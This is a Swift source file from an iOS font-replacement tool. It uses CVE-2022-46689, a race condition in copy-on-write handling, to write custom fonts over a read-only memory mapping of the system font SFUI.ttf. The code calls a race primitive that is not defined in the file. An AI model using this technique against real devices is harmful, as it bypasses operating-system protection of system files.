//
//  OverwriteFontImpl.swift
//  WDBFontOverwrite
//
//  Created by Zhuowei Zhang on 2022-12-25.
//

import UIKit

func overwriteWithFiraSans(completion: @escaping (String) -> Void) {
  overwriteWithFont(name: "FiraSans-Regular.woff2", completion: completion)
}

func overwriteWithRobotoSerif(completion: @escaping (String) -> Void) {
  overwriteWithFont(
    name: "RobotoSerif-VariableFont_GRAD,opsz,wdth,wght.woff2", completion: completion)
}

func overwriteWithNotoSansMono(completion: @escaping (String) -> Void) {
  overwriteWithFont(name: "NotoSansMono-VariableFont_wdth,wght.woff2", completion: completion)
}

func overwriteWithChocoCooky(completion: @escaping (String) -> Void) {
  overwriteWithFont(name: "Chococooky.woff2", completion: completion)
}

func overwriteWithFont(name: String, completion: @escaping (String) -> Void) {
  DispatchQueue.global(qos: .userInteractive).async {
    let succeeded = overwriteWithFontImpl(name: name)
    DispatchQueue.main.async {
      completion(succeeded ? "Success: force close an app to see results" : "Failed")
    }
  }
}

/// Overwrite the system font with the given font using CVE-2022-46689.
/// The font must be specially prepared so that it skips past the last byte in every 16KB page.
/// See BrotliPadding.swift for an implementation that adds this padding to WOFF2 fonts.
func overwriteWithFontImpl(name: String) -> Bool {
  let urlToFont = Bundle.main.url(
    forResource: name, withExtension: nil, subdirectory: "RepackedFonts")!
  let fontData = try! Data(contentsOf: urlToFont)
  // let pathToTargetFont = "/System/Library/Fonts/CoreUI/SFUI.ttf"
  #if true
    let documentDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[
      0
    ].path
    let pathToTargetFont = documentDirectory + "/SFUI.ttf"
    let pathToRealTargetFont = "/System/Library/Fonts/CoreUI/SFUI.ttf"
    let origData = try! Data(contentsOf: URL(fileURLWithPath: pathToRealTargetFont))
    try! origData.write(to: URL(fileURLWithPath: pathToTargetFont))
  #endif

  // open and map original font
  let fd = open(pathToTargetFont, O_RDONLY | O_CLOEXEC)
  if fd == -1 {
    print("can't open font?!")
    return false
  }
  defer { close(fd) }
  // check size of font
  let originalFontSize = lseek(fd, 0, SEEK_END)
  guard originalFontSize >= fontData.count else {
    print("font too big!")
    return false
  }
  lseek(fd, 0, SEEK_SET)
  // Map the part of the font we want to overwrite
  let fontMap = mmap(nil, fontData.count, PROT_READ, MAP_SHARED, fd, 0)
  if fontMap == MAP_FAILED {
    print("map failed")
    return false
  }
  close(fd)
  guard mlock(fontMap, fontData.count) == 0 else {
    print("can't mlock")
    return false
  }

  // for every 16k chunk, rewrite
  for chunkOff in stride(from: 0, to: fontData.count, by: 0x4000) {
    // we only rewrite 16383 bytes out of every 16384 bytes.
    let dataChunk = fontData[chunkOff..<min(fontData.count, chunkOff + 0x3fff)]
    var overwroteOne = false
    for _ in 0..<2 {
      let overwriteSucceeded = dataChunk.withUnsafeBytes { dataChunkBytes in
        print(fontMap!.advanced(by: chunkOff), dataChunkBytes)
        return unaligned_copy_switch_race(
          fontMap!.advanced(by: chunkOff), dataChunkBytes.baseAddress, dataChunkBytes.count)
      }
      if overwriteSucceeded {
        overwroteOne = true
        break
      }
      print("try again?!")
      sleep(1)
    }
    guard overwroteOne else {
      print("can't overwrite")
      return false
    }
  }
  print("successfully overwrote everything")
  return true
}
